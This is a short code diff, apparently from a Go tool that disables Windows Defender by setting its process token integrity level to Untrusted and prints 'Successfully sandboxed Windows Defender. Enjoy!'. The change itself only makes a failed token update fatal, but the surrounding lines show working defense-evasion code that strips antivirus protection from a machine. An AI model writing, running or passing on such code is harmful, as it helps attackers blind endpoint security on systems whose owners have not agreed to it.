@@ -67,7 +67,7 @@ func main() {
 
 	err = calls.SetTokenInformation(dTokenHandle, syscall.TokenIntegrityLevel, uintptr(unsafe.Pointer(tml)), tmlSize)
 	if err != nil{
-		fmt.Println("[!] Unable to set the token integrity to Untrusted")
+		log.Fatal(fmt.Println("[!] Unable to set the token integrity to Untrusted"))
 	}
 	fmt.Println("[+] Token integrity set to Untrusted")
 	fmt.Println("[+] Successfully sandboxed Windows Defender. Enjoy!")
